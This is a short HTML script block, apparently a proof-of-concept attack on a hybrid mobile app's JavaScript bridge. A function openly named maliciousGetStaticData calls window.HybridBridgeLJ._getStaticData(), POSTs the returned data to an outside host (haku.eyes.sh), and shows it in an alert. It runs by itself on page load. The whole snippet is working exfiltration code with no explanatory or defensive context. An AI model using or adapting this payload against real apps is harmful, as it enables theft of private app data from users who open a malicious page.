<script>

function maliciousGetStaticData() {
    var data = window.HybridBridgeLJ._getStaticData();
    fetch("http://haku.eyes.sh?beike", {
    method: "POST",
    body: data
    });
    alert(data);
 }

maliciousGetStaticData();
</script>
